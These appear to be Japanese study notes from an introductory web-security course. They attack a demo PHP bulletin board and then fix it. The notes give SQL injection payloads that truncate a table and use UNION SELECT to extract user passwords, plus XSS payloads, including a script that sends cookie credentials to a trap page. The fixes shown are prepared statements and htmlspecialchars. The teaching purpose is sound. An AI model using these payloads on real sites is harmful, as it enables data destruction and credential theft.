<!-- omit in toc -->
#  Webセキュリティ入門編1: ウェブサイトの攻撃手法と対策の実践 (Chapter 01)


<!-- omit in toc -->
# 目次
- [01:最近のセキュリティ動向を知ろう](#01最近のセキュリティ動向を知ろう)
  - [レッスンの目的と対象者](#レッスンの目的と対象者)
  - [SQLインジェクションとは](#sqlインジェクションとは)
  - [クロスサイトスクリプティング(XSS)とは](#クロスサイトスクリプティングxssとは)
  - [本レッスンの内容](#本レッスンの内容)
- [02:デモサイトの動作を確認する](#02デモサイトの動作を確認する)
- [03:SQLインジェクションで攻撃する](#03sqlインジェクションで攻撃する)
  - [SQLインジェクションとは](#sqlインジェクションとは-1)
  - [ページのソースを表示する](#ページのソースを表示する)
  - [MySQLのデバッグ出力を確認する](#mysqlのデバッグ出力を確認する)
  - [掲示板の投稿をすべて削除する](#掲示板の投稿をすべて削除する)
  - [SQLクエリをunionでつなげる](#sqlクエリをunionでつなげる)
  - [ユーザーの情報を不正に取得する](#ユーザーの情報を不正に取得する)
- [04:SQLインジェクションの対策をおこなう](#04sqlインジェクションの対策をおこなう)
  - [SQLインジェクションの原因](#sqlインジェクションの原因)
  - [プログラムを修正する](#プログラムを修正する)
  - [プレースホルダとは](#プレースホルダとは)
    - [演習模範解答から](#演習模範解答から)
- [05:クロスサイトスクリプティングで攻撃する](#05クロスサイトスクリプティングで攻撃する)
  - [クロスサイトスクリプティング(XSS)とは](#クロスサイトスクリプティングxssとは-1)
  - [クッキーの確認](#クッキーの確認)
  - [投稿フォームにHTMLを入力してみる](#投稿フォームにhtmlを入力してみる)
  - [投稿フォームにJavaScriptを入力してみる](#投稿フォームにjavascriptを入力してみる)
  - [trapページに強制遷移させるJavaScript](#trapページに強制遷移させるjavascript)
- [06:クロスサイトスクリプティングの対策をおこなう](#06クロスサイトスクリプティングの対策をおこなう)
  - [クロスサイトスプリティング(XSS)の原因](#クロスサイトスプリティングxssの原因)
  - [プログラムを修正する](#プログラムを修正する-1)



<br>

---

<br>

# 01:最近のセキュリティ動向を知ろう

## レッスンの目的と対象者

- 目的: Webサイトの攻撃手法と対策方法を実践を通して理解すること
- 対象者: PHP入門編を学習済みの人

  - PHP入門編: https://paiza.jp/works/php/primerfemale
  - HTML/CSS入門編: https://paiza.jp/works/html/primer
  - SQL入門編: https://paiza.jp/works/sql/primer

> [!CAUTION]
> 本レッスンの攻撃内容を外部のサイトにおこなうと犯罪になりますので、ご注意ください。


##  SQLインジェクションとは

- インジェクション：意図しないコードをシステムに注入し、実行させること
- SQLインジェクション：インジェクションで意図しないSQLコードを実行させること
  - (具体例) 通常は参照できないデータベースの値を盗み見たり、データを破壊・改ざんしたりする


## クロスサイトスクリプティング(XSS)とは
- クロスサイトスクリプティング：
  - Webサイト側の意図しないスクリプトを何らかの方法でサイトに埋め込むことで、そのサイトの利用者のブラウザでスクリプトを実行させること

  - (具体例) 悪意のあるスクリプトによって、サイト内でユーザーが個人情報を表示するページを開いたときに、そのページの情報を第三者のサイトに送信する

##  本レッスンの内容

1. デモページのユーザーパスワードを盗む
   - 【SQLインジェクション】
   - 不正なSQLを実行させる
   - データベースから他のユーザーのデータを盗む
   - 【XSS】
   - Webサイト側の意図しないスクリプトを埋め込む
   - クッキーから情報を盗む

2. それぞれの手法についての対策をおこなう
   - 【SQLインジェクション】
     - ユーザー入力のSQLが実行されるのを防ぐ
   - 【XSS】
     - ユーザー入力がスクリプトとして実行されないようにする

<br>

---

<br>

# 02:デモサイトの動作を確認する

> [!TIP]
> この章はただログインだけ

<br>

---

<br>

# 03:SQLインジェクションで攻撃する

## SQLインジェクションとは
   - インジェクション：意図しないコードをシステムに注入し、実行させること
   - SQLインジェクション：インジェクションで意図しないSQLコードを実行させること
     - (具体例) 通常は参照できないデータベースの値を盗み見たり、データを破壊・改ざんしたりする

## ページのソースを表示する
掲示板のWebサイトを開いているところで右クリックして、「フレームのソースを表示」を選択します。
※本動画ではブラウザにGoogle Chromeを使用しています。


## MySQLのデバッグ出力を確認する
掲示板の検索欄で「Hello」を検索すると、ソースのHTMLには以下のコメントが含まれています。

```XML
<!-- [debug SQL]: SELECT id, content, user_name FROM bbs WHERE content like "%Hello%" -->
```

ここから、掲示板で検索すると、システムの内部で、
```sql
SELECT id, content, user_name FROM bbs WHERE content like "%(検索文字列)%"
```


というSQLが実行されることがわかります。



## 掲示板の投稿をすべて削除する

   - 検索欄で「`"; TRUNCATE TABLE bbs; --` 」を検索すると、内部で実行されるSQLは以下のようになります。

```sql
SELECT id, content, user_name FROM bbs WHERE content like "%"; TRUNCATE TABLE bbs; -- %"
```

SQL文では 「--」 以降がコメントになるので、
```sql
SELECT id, content, user_name FROM bbs WHERE content like "%"; TRUNCATE TABLE bbs;
```

というSQLが実行されることになります。

   - `TRUNCATE TABLE`は指定したテーブルからすべての行を削除するSQLです。
     - これによって、bbsテーブルの内容が意図せず削除されてしまいます。


## SQLクエリをunionでつなげる
SQLでunionを使うと、テーブルの末尾に1行分のレコードを結合して出力します。

検索欄で「`"; union select 1, 2, 3; --` 」を入力して検索すると、システムの内部では、
```sql
SELECT id, content, user_name FROM bbs WHERE content like "%" union select 1, 2, 3; -- %"
```

というSQLが実行されます。

掲示板のページには、検索結果として
|comment|	user_name|
-------|----------|
|2|3|

が表示されているので、

SELECTの2番目に指定した値がcommentの行に、3番目に指定した値がuser_nameの行に表示されることが確認できます。


##  ユーザーの情報を不正に取得する

userテーブルにnameとpasswordというカラムがあることを予想して、検索欄に
「`"; union select 1, name, password from user; --` 」
と入力して検索します。


すると、システムの内部では、
```sql
SELECT id, content, user_name FROM bbs WHERE content like "%" union select 1, name, password from user; -- %"
```

というSQLが実行されます。

- ログイン情報がuserテーブルにnameとpasswordというカラムで保存されていた場合には、
- Webページの表示結果から他のユーザーのログイン情報を知ることができてしまいます。


- SQLの「;（セミコロン）」：終わりを示す記号
- SQLの「単一行コメント (--) 」：-- の後に記述された内容は、その行の終わりまでコメントとして扱われます。
- SQLの「複数行コメント (/*～*/) 」：/* で開始し、*/ で終了する範囲がコメントになります。
- SQLの「パーセント記号 (%)」： 主に LIKE 演算子と組み合わせて使用され、任意の0文字以上の文字列を表します。これにより、部分一致検索が可能になります。
- SQLの「アンダースコア (_) 」： LIKE 演算子で任意の1文字を表します。

<br>

---

<br>



# 04:SQLインジェクションの対策をおこなう

## SQLインジェクションの原因
この掲示板アプリの検索機能には、
  - ユーザーの入力の先頭にダブルクォートが入ると、本来閉じるべきでないダブルクォートが閉じられてしまう
  - ダブルクォートを閉じた後の文字列がSQLとして解釈されてしまうという問題点がありました。



## プログラムを修正する
public_html/index.phpの33行目以降をつぎのように修正します。

(修正前)
```php
  $query = 'SELECT id, content, user_name FROM bbs WHERE content like "%' . $keyword . '%"';
  $sth = $pdo->query($query);
```


(修正後)
```php
  $query = 'SELECT id, content, user_name FROM bbs WHERE content like :keyword';
  $sth = $pdo->prepare($query);
  $sth->bindValue(':keyword', '%' . $keyword . '%', PDO::PARAM_STR);
  $sth->execute();
```


## プレースホルダとは
```php
$query = 'SELECT id, content, user_name FROM bbs WHERE content like :keyword';
```
の `:keyword` は、「プレースホルダ」と呼ばれます。

ここでは、
  - SQLのユーザーの入力によって決まる部分をプレースホルダに置き換えておく
  - プレースホルダがユーザーの入力によって置き換わるときは、適切に記号のエスケープがおこなわれるようにする
という手順にすることで、不正なSQLが実行されるのを防止しています


### 演習模範解答から
- 悪意のあるSQLは、全文フルに書いて埋め込むのではなく、SELECT,INSERTなどの一般的な文を予測してSQL分の一部だけを投稿する試みもある。

PHP内の実行前のSQLで、プリペアドステートメントを使わない組み方を狙って下記が考えられる。

```sql
INSERT INTO hoge ('name','content') VALUES (".$name.", "$content");
```

`$content`の中に「`hoge"),("hack","hello"); --`」にすると見事にインジェクション出来る。


<br>

---

<br>

# 05:クロスサイトスクリプティングで攻撃する

## クロスサイトスクリプティング(XSS)とは

- Webサイト側の意図しないスクリプトを何らかの方法でサイトに埋め込むことで、そのサイトの利用者のブラウザでスクリプトを実行させること
  - (具体例) 悪意のあるスクリプトによって、サイト内でユーザーが個人情報を表示するページを開いたときに、そのページの情報を第三者のサイトに送信する


## クッキーの確認
Google Chromeの場合は、

`「設定」`→`「詳細設定」`→`「サイトの設定」`→`「Cookie」`→`「すべてのCookieとサイトデータを表示」`

の順に操作し、デモサイトのドメイン名(ブラウザのURIの「localhost-xxx.learning.paiza-user-learning.cloud」の部分)で検索します。

※paizaラーニングでは、デモサイトのドメインが毎回別のものになるので、画面の中のブラウザからコピーしてください


## 投稿フォームにHTMLを入力してみる
以下を入力すると、HTMLで指定したとおりの色・サイズで「文字」が出力されます。

```XML
<span style="color: red; font-size: 80px;">文字</span>
```



## 投稿フォームにJavaScriptを入力してみる
以下を入力すると、アラートダイアログが表示されるようになります。

```XML
<script>alert(document.cookie);</script>
```

※ためす際は、画面の中のブラウザの右上にある「新しいウインドウで開く」でウインドウを開いてください



##  trapページに強制遷移させるJavaScript
このチャプターで使用したスクリプトです。

```XML
<script>window.location='trap.php?'+document.cookie.match(/(user_name=.+?);/)[1]+'&'+document.cookie.match(/(user_password=.+?);/)[1]</script>
```




<br>

---

<br>


# 06:クロスサイトスクリプティングの対策をおこなう

## クロスサイトスプリティング(XSS)の原因
この掲示板アプリの問題点は、ユーザーの投稿がHTMLやJavaScriptとしてそのまま表示・実行されるようになっていることです。

この場合、想定外の見た目や部品をサイトに埋め込まれてしまう可能性があります。


## プログラムを修正する
public_html/index.phpの58、59行目をつぎのように修正します。

(修正前)
```php 
<td><?= $row[1] ?></td>
<td><?= $row[2] ?></td>
```

(修正後)
```php
<td><?= htmlspecialchars($row[1]) ?></td>
<td><?= htmlspecialchars($row[2]) ?></td>
```


`htmlspecialchars`関数を使えば、ユーザーが入力したデータを、HTMLやJavaScriptとして解釈されないようにエスケープ処理することができます。








<br>

---

<br>



【EOF】



[←　README](../README.md)

